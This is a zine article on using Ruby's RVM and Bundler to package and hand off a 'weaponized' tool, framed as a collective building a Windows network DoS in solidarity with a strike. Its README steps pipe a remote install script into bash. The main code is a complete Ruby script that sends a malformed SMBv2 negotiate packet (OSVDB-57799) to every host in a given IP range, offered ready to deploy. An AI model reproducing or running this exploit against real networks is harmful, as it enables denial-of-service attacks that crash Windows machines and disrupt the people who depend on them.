---
layout: default
title: "Hack This Zine #10 article - Delivering Weaponized Exploits with Ronin, RVM, and Bundler with evoltech and postmodern"
---

# Hack This Zine #10 article - Delivering weaponized exploits with Ronin, RVM, and Bundler

One of the challenges I have found when developing with ruby has been with configuring my ruby development environment.  Trying to get the right version of ruby installed then all of the required gems only to find out that I need to upgrade my copy of ruby gems which is not supported by my OS packaging system. Postmodern turned me onto rvm [1] and bundler [2] which has been a revelation similar to the discovery of yum and apt-get after manually managing rpm and dpkg dependencies by hand.  There is some overlapping functionality in rvm and bundler, but they can be used together to prevent you from having to install a specific ruby environment from scratch, and provides a simple way to specify application dependencies for development and deployment.

Consider the following scenario.  You and your tech collective have been tasked with providing a weaponized tool capable DOSing a windows network in solidarity with some general strike.  The requirements of the tool are that it is simple to use, requires running only a few commands, and requires no manual intervention once running.  Your group decides to implement the tool in ruby leveraging the ronin environment.  The group has access to its own custom ronin overlays, and custom ruby libraries which are not publicly published, as well as all of the other public ruby libraries which are published. After  finishing the app your group needs a simple way to package it all up and send it off to the folk who requested the tool.  This can be done easily with rvm and bundler.  The included Readme.txt sent to your allies may look something like this:

Install a Ruby 1.9.1 environment with rvm (pay attention to any notes on
modifying your .bashrc here):

        $ bash < <( curl http://rvm.beginrescueend.com/releases/rvm-install-head )
        $ exec ~/.bashrc
        $ rvm install 1.9.1 ; rvm 1.9.1
        $ gem install bundler

Pull down the code for the netDOS app (contents of this are described below)
        # Note: no one but your tech-collective and client has access to this repo.

        $ git clone git://your.sketchy.crew.org/netDos.git
        $ cd netDos

Install the dependencies for the netDOS app:

        $ bundle install

Run netDos:

        $ ./netDos 10.1.1.1/24

To make achieve this level of ease all the team had to do is specify the specific dependencies for netDOS in a file called `Gemfile` in the apps main directory that references the specific version of the libraries used, optionally with a path to a source location.  ie:

        $ cat Gemfile
        source :gemcutter
        gem 'open_namespace', '~> 0.3.0'
        gem 'dm-core', '~> 0.10.0'
        gem 'ronin', '~> 0.4.0', :git =>'https://github.com/ronin-ruby/ronin.git'
        gem 'ronin-support', '~> 0.1.0', :git =>'https://github.com/ronin-ruby/ronin-support.git'

Then roll it up for deployment with (saving all dependencies in your app's main directory under vendor/cache):
        $ bundle package

A quick look through recent vulnerabilities brings you to a likely match from OSVDB-57799 [3] which describes a flaw in the SMBv2 that can trigger a dereference 
to an out of bound memory area.  And bonus for you (cause you have been working late nights and all your get for all this activisty work is dumpstered bagels) someone already wrote a proof of concept [4].  All you have to do is weaponize it for your clients target [5]:

{% highlight ruby %}
#!/usr/bin/env ruby
require 'ronin/extensions/ip_addr'
require 'ronin/network/tcp'

payload = [
  "\x00\x00\x00\x90", # Begin SMB header: Session message
  "\xff\x53\x4d\x42", # Server Component: SMB
  "\x72\x00\x00\x00", # Negociate Protocol
  "\x00\x18\x53\xc8", # Operation 0x18 & sub 0xc853
  "\x00\x26", # Process ID High: --> :) normal value should be "\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe",
  "\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54",
  "\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31",
  "\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00",
  "\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57",
  "\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61",
  "\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c",
  "\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c",
  "\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e",
  "\x30\x30\x32\x00"
].join

unless ARGV.length > 0
  puts "usage: [IPv4 | IPv6 | CIDR Range | Globbed Range] ..."
  puts "examples:"
  puts " #{$0} 10.1.1.1"
  puts " #{$0} 10.1.1.1/24"
  puts " #{$0} 10.1.*.1-5"
  exit -1
end 

ARGV.each do |range|
  IPAddr.each(range) do |ip|
    begin
      puts "[-] Sending SMB payload to #{ip} ..."
      Net.tcp_connect_and_send(payload,ip,445)
    rescue
      puts "[!] Skipping #{ip}"
      next
    end
  end
end
{% endhighlight %}

This file would be included in the repo with the Gemfile as well as the 
Gemfile.lock, and all of the files installed in vendor/cache after running `bundle package`.  Then finish the night by sending off an email with the simple instructions above to your friends, grab beverage of your choice, and head down to the tracks to enjoy the rest of your evening.

[1] RVM - Ruby Version Manager http://rvm.beginrescueend.com/

[2] Bundler is a tool that manages gem dependencies for your ruby application. It takes a gem manifest file and is able to fetch, download, and install the gems and all child dependencies specified in this manifest. It can manage any update to the gem manifest file and update the bundle's gems accordingly. It also lets you run any ruby code in context of the bundle's gem environment.
https://github.com/carlhuda/bundler/blob/master/README.md

[3] OSVDB-57799 'Microsoft Windows srv2.sys Kernel Driver SMB2 Malformed 
NEGOTIATE PROTOCOL REQUEST Remote DoS' : http://osvdb.org/57799

[4] OSVDB-57799 proof of concept by Laurent Gaffié : 
http://g-laurent.blogspot.com/2009/09/windows-vista7-smb20-negotiate-protocol.html

[5] Weaponized OSVDB-57799 written by postmodern: http://gist.github.com/183261
